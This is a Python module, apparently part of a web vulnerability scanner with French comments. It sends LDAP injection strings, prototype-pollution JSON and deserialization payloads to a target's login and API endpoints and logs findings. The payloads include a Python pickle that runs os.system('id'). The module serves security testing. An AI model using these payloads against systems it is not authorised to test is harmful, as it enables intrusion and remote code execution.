"""Injections avancées — LDAP, prototype pollution, deserialization."""

from __future__ import annotations

import json

import requests

from .utils import Finding, build_url_with_params, get_base_url, normalize_url, safe_request

LDAP_PAYLOADS = ["*", "admin)(&)", ")(cn=*))(|(cn=*", "*)(uid=*))(|(uid=*"]
PROTO_POLLUTION = [
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"__proto__": {"isAdmin": true}}',
]
DESER_PAYLOADS = [
    ("java", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0"),  # base64 hint
    ("php", "O:8:\"stdClass\":0:{}"),
    ("python", "cos\nsystem\n(S'id'\ntR."),
]


class InjectionAdvancedScanner:
    """LDAP, prototype pollution, deserialization."""

    def __init__(self, target: str, session: requests.Session):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.findings: list[Finding] = []

    def run_full_scan(self) -> list[Finding]:
        self._test_ldap()
        self._test_prototype_pollution()
        self._test_deserialization()
        return self.findings

    def _test_ldap(self) -> None:
        login_paths = [f"{self.base_url}/login", f"{self.base_url}/api/login", self.target]
        for url in login_paths:
            for payload in LDAP_PAYLOADS:
                for field in ("username", "user", "uid", "cn", "email"):
                    resp = safe_request(self.session, "POST", url, data={field: payload, "password": "x"})
                    if not resp:
                        continue
                    if any(err in resp.text.lower() for err in ("ldap", "distinguished name", "invalid credentials", "javax.naming")):
                        self.findings.append(
                            Finding(
                                title=f"LDAP Injection — champ '{field}'",
                                severity="critical",
                                category="LDAP Injection",
                                url=url,
                                description="Erreur LDAP ou bypass détecté",
                                evidence=f"Payload: {payload}",
                            )
                        )
                        return

    def _test_prototype_pollution(self) -> None:
        endpoints = [self.target, f"{self.base_url}/api/user", f"{self.base_url}/api/config"]
        for url in endpoints:
            for payload_str in PROTO_POLLUTION:
                try:
                    payload = json.loads(payload_str)
                except json.JSONDecodeError:
                    continue
                resp = safe_request(self.session, "POST", url, json=payload)
                if resp and resp.status_code == 200:
                    if "admin" in resp.text.lower() and resp.status_code == 200:
                        self.findings.append(
                            Finding(
                                title="Prototype Pollution possible",
                                severity="high",
                                category="Prototype Pollution",
                                url=url,
                                description="__proto__ injection acceptée",
                                evidence=payload_str,
                                remediation="Utiliser Object.create(null) ou freeze prototypes",
                            )
                        )

    def _test_deserialization(self) -> None:
        endpoints = [f"{self.base_url}/api", f"{self.base_url}/deserialize", self.target]
        for url in endpoints:
            for dtype, payload in DESER_PAYLOADS:
                resp = safe_request(
                    self.session, "POST", url,
                    data=payload,
                    headers={"Content-Type": "application/octet-stream"},
                )
                if resp and any(err in resp.text for err in ("Serialization", "unserialize", "ObjectInputStream", "pickle")):
                    self.findings.append(
                        Finding(
                            title=f"Désérialisation {dtype} potentielle",
                            severity="critical",
                            category="Insecure Deserialization",
                            url=url,
                            description=f"Endpoint traite des données sérialisées ({dtype})",
                            evidence=resp.text[:200],
                        )
                    )
